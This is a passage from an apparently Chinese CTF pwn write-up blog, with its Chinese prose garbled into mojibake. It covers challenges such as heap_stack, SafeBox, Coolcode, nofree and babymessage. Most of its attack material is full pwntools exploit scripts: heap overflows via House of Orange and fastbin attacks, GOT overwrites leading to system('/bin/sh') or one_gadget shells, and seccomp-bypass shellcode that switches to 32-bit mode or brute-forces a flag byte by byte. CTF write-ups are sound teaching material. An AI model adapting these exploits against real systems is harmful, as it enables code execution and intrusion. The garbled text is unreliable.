libc_base + 0xf1207\nrealloc = libc_base + libc.sym['realloc']\nfree(1)\nfree(2)\nfree(1)\nnew(0x68,p64(malloc_hook - 0x23),'2222')\nnew(0x68,'ld1ng','ld1ng')\nnew(0x68,'ld1ng','ld1ng')\nnew(0x68,'\\x00'*(0x13-8) + p64(og) + p64(realloc + 4),'ld1ng')\nmenu(1)\np.interactive()\n```\n\n\n\n# 0x04 ciscn2020 pwn2\n\nä¸€é“å›½èµ›é¢˜ï¼Œ**pwnht**å­¦é•¿èµ›åç»™æˆ‘å‘äº†expï¼Œä»Šå¤©æ‰æƒ³èµ·æ¥çœ‹ä¸€ä¸‹ï¼Œä¸è¿‡å­¦é•¿æœ‰äº›åœ°æ–¹å†™çš„ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ‰€ä»¥æ ¹æ®æ€è·¯æ”¹äº†æ”¹ï¼Œç°åœ¨èµ·ç è‡ªå·±èƒ½çœ‹æ‡‚äº†ã€‚\n\né¢˜ç›®å«heap_stackï¼Œæœ¬ä»¥ä¸ºä¼šå’Œæ ˆæœ‰å…³å…¶å®ä¸ç„¶\n\n![image-20200929161614624](https://i.loli.net/2020/09/29/lQUBk9MxvRVnOHW.png)\n\nåƒæ™®é€šå †é¢˜ä¸€æ ·ï¼Œpushå’Œpuuuuushç›¸å½“äºaddï¼Œpopæ˜¯å¢åŠ å¯pushçš„æ¬¡æ•°ï¼Œshowå°±æ˜¯show\n\næ¼æ´å­˜åœ¨äºpushå‡½æ•°ä¸­ï¼Œå­˜åœ¨å †æº¢å‡º\n\n```c\nunsigned __int64 push()\n{\n  __int64 nbytes; // ST00_8\n  size_t size; // ST08_8\n  void *buf; // ST10_8\n  unsigned __int64 v4; // [rsp+18h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  if ( num <= 9 )\n  {\n    puts(\"size?\");\n    nbytes = sub_B49();\n    size = nbytes & 0xFFF;//å–åä¸‰ä¸ªå­—èŠ‚\n    buf = malloc(size);\n    puts(\"content?\");\n    read(0, buf, nbytes);//è¯»å…¥çš„å¤§å°æœªä½œé™åˆ¶\n    printf(\"Malloc at  %p.\\n\", buf, nbytes, size);\n    ptr[num++] = buf;\n  }\n  return __readfsqword(0x28u) ^ v4;\n}\n```\n\nèµ·ç æ‰¾åˆ°æ¼æ´ååœ¨fixé˜¶æ®µè¿˜æ˜¯æœ‰å¸®åŠ©çš„\n\nåˆ©ç”¨æ–¹å¼ä¸ºHouse of Orangeï¼Œæ³„éœ²å‡ºlibcï¼Œåˆ©ç”¨puuuushå¯ä»¥ç”³è¯·å¤§å †å—çš„ç‰¹ç‚¹ï¼Œè®²å †å—ç”³è¯·åˆ°malloc_hookå¤„ï¼Œä¿®æ”¹ä¸ºone_gadgetä¹‹åè§¦å‘æ¼æ´å³å¯ã€‚\n\n## exp\n\n```python\n#!/usr/bin/env python\nfrom pwn import *\n#context.log_level='debug'\ndef uu64(data):\n\tnum = u64(data.ljust(8, b'\\x00'))\n\tlog.success(\"%#x\" %(num))\n\treturn num\ndef add(size,text):\n\tio.sendlineafter(\">\",str(1))\n\tio.sendlineafter(\"?\",str(size))\n\tio.sendafter(\"?\",text)\ndef add2(size,text):\n\tio.sendlineafter(\">\",str(2))\n\tio.sendlineafter(\"?\",str(size))\n\tio.sendafter(\"?\",text)\nlibc=ELF('/lib/x86_64-linux-gnu/libc.so.6')\nio=process('./heap_stack')\nadd(0x1018,p64(0x20)+p64(0xfe1)+p64(0x20)+p64(0x0fe1))#æ”¹topchunkå¤§å°\nadd(0xfff,'bbb')#HOOï¼Œunsortedbin\nadd(0xfb0,p8(0x78))\nio.sendlineafter(\">\",str(4))#show\nio.recv()\nlibc_addr=uu64(io.recv(6))\na= [0x45226,0x4527a,0xf0364,0xf1207]\nlibc_base=libc_addr-0x68-libc.sym['__malloc_hook']\n#print hex(libc.sym['__malloc_hook'])\nmalloc_hook=libc_base+libc.sym['__malloc_hook']\none_gadget=libc_base+a[3]\nprint(\"libc_base=\"+hex(libc_base))\nadd(0xfe0-0x90-0x10,'a')\n\nadd(0x1000,'a'*0x10+p64(0x20)+p64(0xFFFFFFFFFFFFFfe1))#æ”¹topchunk\nio.recvuntil(\"Malloc at  \")\nheap_addr=int(io.recv(14),16)\noffset=malloc_hook-(heap_addr+0x30)\nadd2(offset,'a')\nadd(0x20,p64(one_gadget))\n# io.recvuntil('>',str(3))\n# add(0x30,'a')\npause()\nio.interactive()\n\n```\n\nä¸´è¿‘ä¸‹è¯¾ç»ˆäºæˆåŠŸäº†ï¼Œï¼Œokok\n\n![image-20200929163303056](https://i.loli.net/2020/09/29/X5W1dEGZnt2lN6h.png)\n\n# 0x06 å°ç»“\n\nè¿˜æœ‰ä¸€ä¸ªé¢˜ç½‘ä¸Šèµ„æ–™ä¹Ÿæ¯”è¾ƒå°‘ï¼Œåä¸€è¡¥","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Aug_Match 2020","url":"/2020/09/01/Aug_Match/","content":"\n# 0x00 å‰è¨€\n\n2020å¹´åœ¨å®¶æ‘¸é±¼çš„æš‘å‡ç”Ÿæ´»å¿«ç»“æŸäº†ï¼Œç»ˆäºè¦å¼€å­¦äº†ï¼Œå¥½é•¿æ—¶é—´ä¸æ›´åšå®¢äº†ï¼Œä¸€ç›´æ”’ç€ä¸€èµ·å‘ï¼Œå†åŠ ä¸Šç°åœ¨çš„é¢˜ç›®ç½‘ä¸Šè¯¦ç»†è§£æè¶Šæ¥è¶Šå°‘ï¼Œåªèƒ½è‡ªå·±æ…¢æ…¢å•ƒï¼Œæˆ‘åˆå•ƒå¾—æ¯”è¾ƒæ…¢\n\nåœ¨è¿™æˆ‘ä¼šè®°å½•å¹¶å¤ç°ä¸€äº›æ¯”èµ›æ—¶çš„é¢˜ç›®ï¼Œæƒå½“ä¸€ä¸ªæœˆæ¥çš„å­¦ä¹ æˆæœï¼Œè¿˜å¯ä»¥æä¸€ä¸ªæ¯æœˆç³»åˆ—ï¼ˆä¸é”™ä¸é”™ï¼‰\n\n------\n\n# 0x01 2020å¤©ç¿¼æ¯ SafeBox\n\nå…ˆçœ‹é¢˜ç›®æè¿°ï¼šTry to get the secret from SafeBox! Flag is at /home/pwn/flag\n\nchecksecï¼Œä¿æŠ¤å…¨å¼€\n\n![](https://s1.ax1x.com/2020/08/06/ag3VMT.png)\n\nmmapç»™destèµ‹äºˆäº†7çš„æƒé™ï¼Œæœ€åå‡½æ•°æŒ‡é’ˆæ‰§è¡Œäº†destã€‚å…¸å‹çš„shellcodeã€‚prtclå’Œseccompå¼€äº†æ²™ç›’ã€‚\n\n\n\n![image-20200824204011656](https://i.loli.net/2020/08/24/6tvfJlVAZPeNmpQ.png)\n\nèƒ½è°ƒç”¨çš„å‡½æ•°åªæœ‰openå’Œreadï¼Œä¸èƒ½ä½¿ç”¨writeï¼Œåªèƒ½åˆ©ç”¨readå‡½æ•°è¯»å–flagï¼Œç„¶åè·Ÿæœ¬åœ°çš„flagä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚å»æ¯”è¾ƒã€‚\n\nè¿˜æœ‰å½“readçš„fd<4æ—¶ï¼Œä¼šç›´æ¥è·³åˆ°0013KILLæ‰ï¼Œå°±æ˜¯è¯´fdè¦å¤§äºç­‰äº4ã€‚æ‰€ä»¥å†™shellcodeæ—¶openä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ–‡ä»¶æ ‡è¯†ç¬¦æ˜¯3ï¼Œç¬¬äºŒæ¬¡æ–‡ä»¶æ ‡è¯†ç¬¦æ˜¯4ã€‚\n\nçˆ†ç ´çš„æ–¹æ³•å°±æ˜¯æŠŠå•ä¸ªå­—èŠ‚çš„flag(rsp+index)æ”¾è¿›alå¯„å­˜å™¨ï¼Œç”¨asciiç 0x20-0x7fä¹‹é—´çš„å­—ç¬¦(content)ä¸€ä¸ªä¸ªå»æ¯”è¾ƒï¼Œè‹¥cmpæ¯”è¾ƒç»“æœä¸€è‡´åˆ™æ”¹å˜ZFæ ‡å¿—å¯„å­˜å™¨ï¼Œç„¶åç”¨jzè·³è½¬xæ ‡ç­¾å¤„ï¼Œè¿›è¡Œæ­»å¾ªç¯ã€‚\n\n## exp\n\n```python\nfrom pwn import *\nimport os\ncontext.arch = 'amd64'\nelf = ELF('chall')\np = 0\ndef pwn(index,content):\n    global p\t\t\t\t\t\t\t#åœ¨å‡½æ•°å†…éƒ¨å¯¹å‡½æ•°å¤–çš„å˜é‡è¿›è¡Œæ“ä½œï¼Œå°±éœ€è¦åœ¨å‡½æ•°å†…éƒ¨å£°æ˜å…¶ä¸ºglobalå…¨å±€å˜é‡\n\tp = process('./chall')\n\tshellcode= shellcraft.open(\"flag\")  #è°ƒç”¨opençš„ç³»ç»Ÿè°ƒç”¨ï¼Œopen(\"flag\")\n\tshellcode+= shellcraft.open(\"flag\") #å› ä¸ºfdè¦å¤§äºç­‰äº4ï¼Œopenä¸¤æ¬¡\n\tshellcode+='''\t\t\t\t\t\t#read(4,rsp,0x64)\n    xor rax, rax            \n    push 0x64      \t\t\t\t\t\n    pop rdx                        \n    mov rsi, rsp                    \n\tpush 4                              \n\tpop rdi                           \n    syscall                         \nx:\tmov rsi,rsp                         #ç”±äºæˆ‘ä»¬å¾€æ ˆé¡¶è¾“å…¥æ•°æ®ï¼Œå› æ­¤æ­¤æ—¶çš„æ ˆé¡¶å­˜æ”¾æ˜¯flagçš„å†…å®¹ï¼Œå°†rspçš„å†…å®¹èµ‹å€¼ç»™rsi\n\tmov al,[rsi+'''+str(index)+''']     #[rsi+index],å–å‡º[rsi+index]çš„å†…å®¹,å³å°†flagä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚å–å‡ºï¼Œå­˜æ”¾åœ¨alå¯„å­˜å™¨é‡Œï¼Œæ–¹ä¾¿åé¢çˆ†ç ´flag\n\tcmp al,'''+str(content)+'''         #æ¯”è¾ƒå­—ç¬¦ï¼Œä¸å­˜æ”¾åœ¨alå¯„å­˜å™¨ä¸­çš„å•ä¸ªå­—èŠ‚flagæ˜¯å¦ä¸€è‡´\n\tjz x       \t\t\t\t\t\t    #è‹¥ä¸€è‡´åˆ™ç›´æ¥è¿›å…¥æ­»å¾ªç¯ï¼Œéœ€è¦ctrl+dé€€å‡ºï¼Œè‹¥ä¸ä¸€è‡´åˆ™ç›´æ¥è¿”å›\n\t'''\n\tp.sendafter(\"safe-execution box?\\n\",asm(shellcode))\n\tp.recv(timeout = 1)                 #å¦‚æœè¶…è¿‡ä¸€ç§’å°±ä¸ç­‰äº†\n\tp.interactive()\n\tp.close()\n\treturn 1\nif __name__ == '__main__':       \t\t\n\tflag=\"\"\n\tindex=0\n\twhile(1):\n\t\tif '}' in flag:                 #è¯»åˆ°æœ«å°¾è·³å‡ºå¾ªç¯\n\t\tbreak\n\t\tfor i in range(0x20,0x7f):      #contentæ˜¯asciiç 0x20-0x7få¯¹åº”çš„å¯è§å­—ç¬¦ï¼Œforå¾ªç¯ä¸€ä¸ªä¸ªè¯•\n\t\t\ttry:                         #try exceptå¤„ç†æŠ¥é”™ï¼Œflagæ²¡çŒœå¯¹å°±EOFæŠ¥é”™è·³åˆ°ä¸‹é¢æ‰“å°error\n\t\t\t\tprint \"flag=\",flag\n\t\t\t\tif pwn(index,i) :       #æ­»å¾ªç¯å¾—åˆ°æ­£ç¡®å€¼ï¼Œå¼ºåˆ¶é€€å‡ºåä¼šè¿”å›1\n\t\t\t\t\tflag+=chr(i)\t\t#chr()è¿”å›asciiç å¯¹åº”å­—ç¬¦ï¼ŒåŠ åœ¨flagåé¢\n\t\t\t\t\tindex+=1            #è¿›è¡Œä¸‹ä¸€ä¸ªå­—èŠ‚çˆ†ç ´\n\t\t\t\t\tbreak\n\t\t\texcept EOFError:            #è‹¥ç›´æ¥è¿”å›åˆ™æŠ›å‡ºå¼‚å¸¸\n\t\t\t\tprint \"error\"\n\tprint flag\n    \n# DASCTF{0ee3530c57fb0b9c89e7af5d32b9f521} \n```\n\nç¯å¢ƒå·²ç»å…³äº†ï¼Œä½“éªŒå¾ˆä¸å¥½\n\nç°åœ¨éœ€è¦çˆ†ç ´çš„é¢˜è¶Šæ¥è¶Šå¤šï¼Œå¯èƒ½pwnçš„ç²¾é«“å°±åœ¨äºçˆ†ç ´å§\n\n# 0x02 SCTF Coolcode\n\næœ¬é¢˜è€ƒéªŒ(æå¼ºçš„)shellcodeç¼–å†™èƒ½åŠ›\n\næ‹¿åˆ°é¢˜ç›®\n\n![image-20200824174318169](https://i.loli.net/2020/08/24/8vs7gReZM93OVTl.png)\n\nçœ‹èµ·æ¥å¾ˆåƒå †é¢˜ï¼Œä½†æ˜¯NXæ²¡å¼€ï¼Œä¼°è®¡å¯ä»¥åˆ©ç”¨shellcodeï¼Œ\n\n![image-20200824174746374](https://i.loli.net/2020/08/24/sdPHhpxvm1I47w2.png)\n\næ¼æ´çœŸçš„éš¾æ‰¾....åœ¨åˆ›å»ºå †å—æ—¶ï¼Œå¯¹æ•°ç»„ä¸‹æ ‡é”™è¯¯çš„ä½¿ç”¨äº†æœ‰ç¬¦å·æ•°ï¼Œå¯¼è‡´å¦‚æœæˆ‘ä»¬è¾“å…¥**è´Ÿæ•°**ä¹Ÿå¯ä»¥æ»¡è¶³`v1 <= 1`è¿™æ ·çš„æ£€æµ‹ï¼Œè€Œåœ¨æ•°ç»„ä¸Šæ–¹ä¿å­˜äº†ä¾‹å¦‚stdin\\stdout\\stderrã€gotè¡¨ç­‰è¿™æ ·çš„å¯åˆ©ç”¨ä¿¡æ¯ã€‚\nè€Œä¸”è¿™ä¸ªç¨‹åºå¹¶æ²¡æœ‰å¼€å¯FULL RELROæ‰€ä»¥gotè¡¨å¯å†™ï¼Œè¿™æ ·å…¶å®æˆ‘ä»¬å¯ä»¥ç›´æ¥åŠ«æŒgotè¡¨ã€‚\n\n**æ²™ç®±ç»•è¿‡**ï¼š\n\nç¨‹åºé™åˆ¶äº†æˆ‘ä»¬èƒ½ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œå¹¶æ²¡æœ‰openå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½åˆ©ç”¨orw\n\n![](https://i.loli.net/2020/08/24/ozduG6qvYLw7afh.png)\n\nä½†æ˜¯æŸ¥è¯¢ç³»ç»Ÿè°ƒç”¨å·è¡¨ï¼Œå‘ç°fstatè¿™ä¸ªå‡½æ•°å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·5ï¼Œå…¶å®å°±æ˜¯32ä½ç¨‹åºä¸­opençš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œè€Œæ±‡ç¼–ä¸­å­˜åœ¨ä¸€æ¡æŒ‡ä»¤retfqå¯ä»¥ä¾›æˆ‘ä»¬åˆ‡æ¢åˆ°32ä½æŒ‡ä»¤æ¨¡å¼ï¼Œå…¶åŸç†æ˜¯ä¸€ä¸ªcså¯„å­˜å™¨ï¼Œcs=0x23æ—¶è¡¨ç¤º32ä½æ¨¡å¼ï¼Œcs=0x33æ—¶è¡¨ç¤º64ä½æ¨¡å¼ï¼Œ\n\næˆ‘ä»¬åªéœ€è¦åœ¨è¿›è¡Œretfqæ—¶ä¿è¯æ­¤æ—¶rsp=shellcodeåœ°å€ï¼Œ[rsp+8] = 0x23/0x33ï¼Œå°±å¯ä»¥åœ¨æˆ‘ä»¬æƒ³è¦çš„æ¨¡å¼ä¸‹æ‰§è¡Œshellcodeã€‚\n\n![](https://i.loli.net/2020/08/24/DQvIXdqY62F5pHg.png)\n\nå †å’Œbssæ®µå¯æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥å°†shellcodeå†™å…¥bssæ®µæ‰§è¡Œã€‚\nä½†æ˜¯è¿˜æœ‰ä¸€ç‚¹åœ¨äºï¼Œç¨‹åºé™åˆ¶è¾“å…¥å­—ç¬¦åªèƒ½æ˜¯æ•°å­—å’Œå¤§å†™å­—æ¯ï¼Œè¿™æ ·è¾“å…¥shellcodeè‚¯å®šæ˜¯è¡Œä¸é€šçš„\n\n```c\nsigned __int64 __fastcall sub_400B16(__int64 a1, int a2)\n{\n  int i; // [rsp+14h] [rbp-8h]\n\n  for ( i = 0; i < a2 - 1; ++i )\n  {\n    if ( (*(_BYTE *)(i + a1) <= 47 || *(_BYTE *)(i + a1) > 57) && (*(_BYTE *)(i + a1) <= 64 || *(_BYTE *)(i + a1) > 90) )\n      return 1LL;\n  }\n  return 0LL;\n}\n```\n\næ‰€ä»¥ï¼Œè¿˜è¦å…ˆå°†exit()å‡½æ•°çš„gotè¡¨æ”¹ä¸ºretï¼Œä»¥è·³è¿‡è¾“å…¥å­—ç¬¦çš„æ£€éªŒã€‚\n\nè¿™é“é¢˜æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ¸…æ™°ï¼šå› ä¸ºç¨‹åºè¿˜é™å®šäº†è¯»å–å­—èŠ‚é•¿åº¦ï¼Œä¸ºäº†æ–¹ä¾¿ä¸€æ¬¡æ€§æ‰§è¡Œshellcodeï¼Œæˆ‘ä»¬å…ˆå†™å…¥readå°†åé¢shellcodeå†™å…¥åˆ°bssæ®µå¹¶æ‰§è¡Œã€‚shellcodeçš„å†…å®¹ï¼šé¦–å…ˆåˆ‡æ¢32ä½æ¨¡å¼æ‰§è¡Œopen()ç„¶ååˆ‡æ¢å›64ä½æ‰§è¡Œread()ã€write()å³å¯è¯»å–åˆ°flag\n\n## exp\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n#p = './CoolCode'\np = remote(\"39.107.119.192 \", 9999)    \ndef add(idx, content):\n    p.sendlineafter(\"choice :\", '1')\n    p.sendlineafter(\"Index: \", str(idx))\n    p.sendafter(\"messages: \", content)\ndef show(idx):\n    p.sendlineafter(\"choice :\", '2')\n    p.sendlineafter(\"Index: \", str(idx))\ndef free(idx):\n    p.sendlineafter(\"choice :\", '3')\n    p.sendlineafter(\"Index: \", str(idx))\ndef exp():\n    read = '''\n        xor eax, eax\n        mov edi, eax\n        push 0x60\n        pop rdx\n        mov esi, 0x1010101\n        xor esi, 0x1612601\n        syscall\n        mov esp, esi\n        retfq\n    '''\n    open_x86 = '''\n        mov esp, 0x602770\n        push 0x67616c66\n        push esp\n        pop ebx\n        xor ecx,ecx\n        mov eax,5\n        int 0x80\n    '''\n    readflag = '''\n        push 0x33\n        push 0x60272e\n        retfq\n        mov rdi,0x3\n        mov rsi,rsp\n        mov rdx,0x60\n        xor rax,rax\n        syscall\n        mov rdi,1\n        mov rax,1\n        syscall\n    '''\n    readflag = asm(readflag, arch = 'amd64')\n    openflag = asm(open_x86)\n    add(-22, '\\xc3') #exit_got->ret\n    add(-37, asm(read, arch = 'amd64')) #free_got ->read\n    #gdb.attach(p)\n    free(0)\n    \n    payload = p64(0x602710)+p64(0x23)+openflag+readflag\n    p.sendline(payload)\n    p.interactive()\nif __name__ == '__main__':\n    exp()\n\n#SCTF{LDI6Uk9PXa9e98rqFdtxHvN3qO1ZAmnBX76C5D0Ibckv4dqe}\n#éšæœºç”Ÿæˆçš„flag\n```\n\næœ¬é¢˜éœ€è¦é«˜è¶…çš„shellcodeèƒ½åŠ›ï¼Œ/(ã„’oã„’)/å…‰çœ‹å°±å¤Ÿæˆ‘ç†è§£åŠå¤©äº†\næ¯”èµ›æ—¶æœ‰31è§£ï¼Œè¿˜æ˜¯å¾ˆæœ‰éš¾åº¦çš„\n\n***Referenceï¼š***\n\n[syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)\n\n[shellcode çš„è‰ºæœ¯](https://xz.aliyun.com/t/6645)\n\n------\n\n# 0x03 2020 CISCN nofree\n\nå›½èµ›é™¤äº†easyjscï¼Œç®—æ˜¯pwn1äº†ï¼Œé¢˜ç›®æ˜¯è¿™æ ·çš„ï¼ŒåŠŸèƒ½ä¸€ä¸ªæ·»åŠ ä¸€ä¸ªç¼–è¾‘\n\n![image-20200901003905336](https://i.loli.net/2020/09/01/ZA24zES1g6P7kDy.png)\n\nè¿™å°±æ˜¯æœ¬é¢˜éš¾ç‚¹ï¼Œæ²¡æœ‰freeï¼Œæ— æ³•åˆ©ç”¨binsï¼›æ²¡æœ‰showï¼Œæ— æ³•æ³„éœ²æ•°æ®\n\nå…ˆçœ‹addå‡½æ•°\n\n```c\nint add()\n{\n  int result; // eax\n  int idx; // [rsp+8h] [rbp-8h]\n  int size; // [rsp+Ch] [rbp-4h]\n\n  result = put_in_idx();//è¿™é‡Œé™åˆ¶äº†æœ€å¤šå»ºç«‹ä¸‰ä¸ªç´¢å¼•ï¼Œä½†æ˜¯æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥åŒä¸€ç´¢å¼•å¯ä»¥é‡å¤ä½¿ç”¨\n  idx = result;\n  if ( result != -1 )\n  {\n    printf(\"size: \");\n    result = input_0();\n    size = result;\n    if ( result >= 0 && result <= 144 )//æ¯ä¸ªå—ä¸€æ¬¡æœ€å¤šç”³è¯·0x90å¤§å°\n    {\n      *(_QWORD *)&byte_6020C0[16 * idx + 256] = content(result);//å­˜æ”¾å †æŒ‡é’ˆ\n      result = size;\n      *(_QWORD *)&byte_6020C0[16 * idx + 264] = size;//å­˜æ”¾sizeæŒ‡é’ˆ\n    }\n  }\n  return result;\n}\n```\n\nå¯ä»¥çœ‹åˆ°contentå‡½æ•°ï¼Œé‡Œé¢å¹¶æ²¡æœ‰ä½¿ç”¨malloc()ï¼Œè€Œæ˜¯ä½¿ç”¨äº†strdup()ï¼Œä¹Ÿå°±æ˜¯è¯´mallocçš„å †å—å¤§å°å¹¶ä¸ç”±ä½ è¾“å…¥çš„sizeå¤§å°å†³å®šï¼Œè€Œæ˜¯ä½ contentå†…å­—ç¬¦ä¸²çš„å®é™…å¤§å°ï¼Œè€Œeditå‡½æ•°å†…å®¹ä¿®æ”¹æŒ‰ç…§çš„æ˜¯ä½ è¾“å…¥çš„sizeï¼Œè¿™å°±é€ æˆäº†å †æº¢å‡º\n\n```c\nsigned __int64 edit()\n{\n  signed __int64 result; // rax\n  int idx; // [rsp+Ch] [rbp-4h]\n\n  result = put_in_idx();\n  idx = result;\n  if ( (_DWORD)result != -1 )\n  {\n    result = *(_QWORD *)&byte_6020C0[16 * (signed int)result + 256];\n    if ( result )\n    {\n      printf(\"content: \");\n      result = input(*(void **)&byte_6020C0[16 * idx + 256], *(_QWORD *)&byte_6020C0[16 * idx + 264]);\n    }\n  }\n  return result;\n```\n\n- addåŠŸèƒ½ï¼šæœ€å¤š3ä¸ªå—ï¼Œå¤§å°åœ¨0~0x90ä¹‹é—´ï¼Œç”¨çš„strdupå‡½æ•°\n- editåŠŸèƒ½ï¼šèƒ½ç¼–è¾‘ç›¸åº”å †å—ï¼Œå¤§å°ä¸ºaddæ—¶å†™å…¥çš„size\n\nç®€å•æ¥è¯´ï¼Œaddæ—¶å¡«0x20çš„å¤§å°ï¼Œåªå¡«å……0x10çš„å­—ç¬¦ä¸²ï¼Œeditçš„æ—¶å€™å°±å­˜åœ¨æº¢å‡ºæ¼æ´\n\næ‰€ä»¥æ•´ä½“æ€è·¯æ˜¯å…ˆç”¨house of orangeï¼ŒæŠŠtop chunkæ‰”åˆ°fastbinï¼Œç„¶ååˆ©ç”¨å †æº¢å‡ºæ”¹fdæŒ‡å‘bssä¸Šchunk arrayçš„åœ°æ–¹ï¼Œé€šè¿‡ä¿®æ”¹å †æŒ‡é’ˆï¼Œæ¥å°†strdupçš„gotè¡¨æ”¹ä¸ºprintfï¼Œç„¶ååˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å‡ºlibcåŸºå€ï¼Œæœ€ååŒæ ·çš„æ–¹æ³•å°†strdupæ”¹ä¸ºsystemå‡½æ•°ï¼Œè§¦å‘æ¼æ´å³å¯\n\nä¸ºäº†æ–¹ä¾¿æˆ‘åœ¨expä½œäº†æ³¨é‡Šï¼Œå°±ä¸å†è¿‡å¤šèµ˜è¿°\nå‰é¢åšçš„å·¥ä½œå°±æ˜¯ä¸ºäº†æ¥è¿‘è¿™ä¸‰ä¸ªæŒ‡é’ˆï¼Œç”¨æ¥ä¿®æ”¹strdupçš„gotè¡¨\n\n![image-20200901012734532](https://i.loli.net/2020/09/01/MXNzjxZwI71ptac.png)\n\nåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰¾åç§»æ—¶ä¸å¤ªé¡ºåˆ©ï¼Œä¸»è¦è¿˜æ˜¯åŠ¨è°ƒçš„é—®é¢˜ï¼Œå› ä¸ºå‡½æ•°æ¯”è¾ƒå¤šï¼Œè¦å¯¹ç…§IDAçš„ä»£ç çœ‹ï¼Œå¤šç”¨sæ­¥å…¥ï¼Œæ‰èƒ½è°ƒå‡ºæ¥ï¼Œè¿˜è¦æ³¨æ„64ä½çš„å…­ä¸ªå¯„å­˜å™¨ä¼ å‚çš„é—®é¢˜ã€‚\n\n![image-20200901011317070](https://i.loli.net/2020/09/01/7ZvfkbM8O1S4zAd.png)\n\n![image-20200901011403277](https://i.loli.net/2020/09/01/QTz31ln78SUtRxu.png)\n\n## exp\n\n```python\n#coding:utf8\nfrom pwn import *\n#context.log_level = 'debug'\ndebug = 1\nelf = ELF('nofree')\nif debug:\n    sh = process('./nofree')\n    libc = elf.libc\nelse:\n    sh = remote('101.200.53.148', 12301)\n    libc = ELF('libc-2.27-64.so')\n\ndef add(idx,size,data):\n    sh.sendlineafter('choice>> ',str(1))\n    sh.recvuntil('idx: ')\n    sh.sendline(str(idx))\n    sh.recvuntil('size: ')\n    sh.sendline(str(size))\n    sh.recvuntil('content: ')\n    sh.send(str(data))\n\ndef edit(idx,data):\n    sh.sendlineafter('choice>> ',str(2))\n    sh.recvuntil('idx: ')\n    sh.sendline(str(idx))\n    sh.recvuntil('content: ')\n    sh.send(str(data))\nfor i in range(24):\n    add(0,0x90,'a'*0x90)\nadd(0,0x90,'a')\nedit(0,'\\x00'*0x18+p64(0xe1))#ä¿®æ”¹top chunkçš„sizeï¼Œæ³¨æ„å¯¹é½å†…å­˜é¡µ\nadd(0,0x90,'a'*0x30)\nadd(1,0x90,'a'*0x88+p64(0x81))#house of orange\nedit(0,'b'*0x30+p64(0)+p64(0x81)+p64(0x602140))#fastbin attack:fd->0x602140\nadd(0,0x90,'a'*0x70)\nadd(2,0x90,'c'*0x70+p64(0)*3+p64(0x81))#addr:0x602140\nedit(2,'c'*0x70+p64(0x602068)+p64(0x90))#ä¿®æ”¹idx0çš„æŒ‡é’ˆä¸ºstrdupçš„gotè¡¨\nedit(0,p64(0x400700))#æ”¹ä¸ºprintf\n#gdb.attach(sh)\nadd(0,0x10,'%17$p')#fmtstr\n\nlibc_base = int(sh.recv(14),16) - libc.sym['__libc_start_main'] - 240\n#0x20840\nprint hex(libc_base)\nedit(2,'c'*0x70+p64(elf.got['strdup'])+p64(0x90))\nedit(0,p64(libc_base+libc.symbols['system']))\nadd(0,0x10,'/bin/sh\\x00')\nsh.interactive()\n```\n\nonegagetåº”è¯¥ä¹Ÿå¯ä»¥æ²¡è¯•è¿‡ï¼Œå¤ªæ™šäº†æ­‡äº†æ­‡äº†...\n\n***Referenceï¼š***\n\n[house of orange](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/#_1)\n\n[å †æº¢å‡º-House of orange å­¦ä¹ ç¬”è®°](https://bbs.pediy.com/thread-222718.htm)\n\n# 0x04 2020å¼ºç½‘æ¯ babymessage\n\nè¯´åˆ°è¿™é¢˜ï¼Œæ¯”èµ›ä¸€ç™¾å¤šè§£ï¼Œä½†å§‹ç»ˆå¡åœ¨ä¸€ä¸ªç‚¹ï¼Œé¢˜ç›®é™¤äº†NXå¤–ï¼Œæ— å…¶ä»–ä¿æŠ¤\n\n```c\n__int64 work()\n{\n  signed int v1; // [rsp+Ch] [rbp-4h]\n\n  buf = (char *)malloc(0x100uLL);\n  v1 = mm + 16;//å¯è¯»å…¥çš„é•¿åº¦ï¼Œç”±mmå†³å®š\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        while ( 1 )\n        {\n          puts(\"choice: \");\n          __isoc99_scanf((__int64)\"%d\", (__int64)&mm)//mmå³optionï¼Œå­˜å…¥å†…å­˜\n          if ( mm != 1 )\n            break;\n          leave_name();//è¾“å…¥åå­—ï¼Œå­˜åˆ°0x6010D0ä½ç½®\n        }\n        if ( mm != 2 )\n          break;\n        if ( v1 > 256 )\n          v1 = 256;//é•¿åº¦\n        leave_message(v1);//è¾“å…¥ä¿¡æ¯ï¼Œå †å—æŒ‡é’ˆå­˜å…¥0x6010C8å¤„\n      }\n      if ( mm != 3 )\n        break;\n      show(v1);//æ‰“å°\n    }\n    if ( mm == 4 )\n      break;//é€€å‡º\n    puts(\"invalid choice\");\n  }\n  return 0LL;\n}\n```\n\nä¸€ä¸ªå§“åï¼Œä¿¡æ¯å’Œæ‰“å°åŠŸèƒ½çš„ç¨‹åºï¼Œç±»ä¼¼å †é¢˜ä½†æ²¡æœ‰å †çš„å¯åˆ©ç”¨ç‚¹\nç®€å•çœ‹ä¸€ä¸‹optionï¼Œbufï¼Œnameåœ¨å†…å­˜çš„åˆ†å¸ƒ\n\n![image-20200827005910158](https://i.loli.net/2020/08/27/hfIc5FgyqswpevZ.png)\n\næ‰¾å•Šæ‰¾ï¼Œç¨‹åºä¼¼ä¹å†™çš„å¾ˆå¥½ï¼Œæ²¡ä»€ä¹ˆåˆ©ç”¨\nä½†æ˜¯ä¾æ—§å­˜åœ¨ä¸€ä¸ªå°bug\n\n```c\n__int64 __fastcall leave_message(unsigned int a1)\n{\n  int v1; // 